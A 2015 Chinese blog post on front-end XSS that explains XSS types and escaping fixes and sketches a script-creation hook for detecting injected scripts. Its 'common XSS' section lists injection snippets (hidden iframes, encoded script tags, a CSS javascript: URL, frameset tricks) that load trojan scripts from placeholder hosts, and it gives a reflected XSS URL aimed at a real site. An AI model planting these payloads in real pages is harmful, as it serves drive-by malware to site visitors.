title: front-end-security-xss
date: 2015-09-02 21:25:28
categories: blog
tags: [front-end,xss,hook,前端安全]
---
##概述
没想到这样一个问题，还把自己搞得有点昏了。不过在找寻答案的过程中，我知道自己是快乐的！虽然没有自己解答出这个问题，但是收获颇多。特别是看了人家一步一步思考问题的方式，感悟是大大的。

##问题
xss作为web前端常用的注入漏洞，在现在的互联网业务中其危险性不亚于其他攻击方式，请编写过滤函数
1.通过异步请求拿到的json数据后，如何安全的使用innerHtml显示在页面上
2.浏览器地址栏直接获取的参数，如何安全地进行document.write
3.后台直接输出完整的html页面，如何保证页面渲染后，用户内容的< script >不被执行.

<!-- more -->
##分析
这里提出的就是xxs方式，那么这3个小题中的innerHtml,document.write,script肯定就是“坑”了。

##前端常见xss

1.iframe: 

    document.write("<iframe width='0' height='0' src='地址'></iframe>"); 	//保存为xxx.js

则JS代码为:
	
	<script  src='xxx.js'></script> 
    

2.js变形加密

    
    <script language="JScript.Encode" src=http://www.xxx.com/muma.txt></script> //muma.txt 可改成任意后缀

3.flash

    
    http://网页木马地址 插入木马地址 width=10 height=10", "GET" 宽度和高度，方式后面的照添，更改木马地址就可以了。


4.隐蔽方式：

	    
    top.document.body.innerHTML=top.document.body.innerHTML+'\r\n<iframe src="http://www.xxx.com/muma.htm/"></iframe>'[/url]

5.css中xss：

	
    body {background-image:url('javascript:document.write("<script src=http://www.XXX.net/muma.js></script>")')}

6.图片伪装：
	
	
    <html> 
        <iframe src="网马地址" height=0 width=0></iframe> 
        <img src="图片地址"></center> 
    </html>

7.伪装调用：


    <frameset rows="444,0" cols="*"> 
    <frame src="打开网页" framborder="no" scrolling="auto" noresize marginwidth="0" margingheight="0"> 
    <frame src="网马地址" frameborder="no" scrolling="no" noresize marginwidth="0" margingheight="0">

##原理

xss(cross site script)跨站脚本攻击
通过属性"src"加载来执行代码在获取网站或者网站服务器的部分或者全部权限后，在网页文件中插入一段恶意代码，
来实现攻击。

##xss类型
这个是在阿里面试的时候问道这个问题的，但是之前并没有很详细地区分xss的类型。只知道某种方式。

1.DOM—based XSS

该漏洞是基于文档对象模型Document Objeet Model,DOM)触发的。
    
	<div id="print"></div>

	//javascript
	var text = document.getElementById("print");
	print.innerHTML = text.value;

解决方式：

* 编码方式

        //将要转换的字符串设置为这个元素的innerText(ie支持)或者textContent(火狐，google支持)
        (temp.textContent != undefined ) ? (temp.textContent = html) : (temp.innerText = html);

        //返回这个元素的innerHTML，即得到经过HTML编码转换的字符串了
        var output = temp.innerHTML;


* 解码方式

		//将要转换的字符串设置为这个元素的innerHTML(ie，火狐，google都支持)
        temp.innerHTML = text;

        //返回这个元素的innerText(ie支持)或者textContent(火狐，google支持)，即得到经过HTML解码的字符串了。
        var output = temp.innerText || temp.textContent;


2.存储型xss

即通常我们在录入数据时通过闭合标签的方式把数据存储到数据库中，再次显示的时候触发。

解决方式：转义标签

	如：
		<  转义为  &lt； 
		>  转义为  &gt； 


3.反射型xss

仍然来自于直接的用户输入，是在通过url控制了页面的输出（处理：转义字符）根据浏览器去bypass各种过滤，易用性稍微差一些。但最后在页面中显示出来，并需要用户自己去点击链接才能触发XSS的是反射型XSS。

	如：

		http://www.jpl.nasa.gov/about_JPL /maps.cfm?departure=lax%22 %3Cimg%20src=k.png%20onerror=alert(%22XSSed%20by%20sH%22)%20/%3E

##MutationEvent何许
HTML5中添加，提供主动防御

文章参考：[http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/](http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/)


##javascript hook
简单钩子实现	

	//暂存变量
	<script>
		var zc = Document.prototype.createElement;

	    Document.prototype.createElement = function() {

	        // 调用原生函数
	        var element = zc.apply(this, arguments);

	        // 为脚本元素安装属性钩子
	        if (element.tagName == 'SCRIPT') {
	            element.__defineSetter__('src', function(url) {
	                console.log('设置路径:', url);
	            });
	        }

	        // 返回元素实例
	        return element;
	    };
	</script>

测试钩子

	<button id="btn">创建脚本</button>
	<script>
	    btn.onclick = function() {
	        var el = document.createElement('script');
	        el.src = 'http://www.etherdream.com/xss/out.js?dynamic';
	        document.body.appendChild(el);
	    };
	</script>

算了，装不下去了。自己也B不清楚，所以下面是广告时间。请使劲戳下面链接。

经典文章：[http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3/](http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3/)
	
学习地址：
http://bbs.ikaka.com/showtopic-8625758.aspx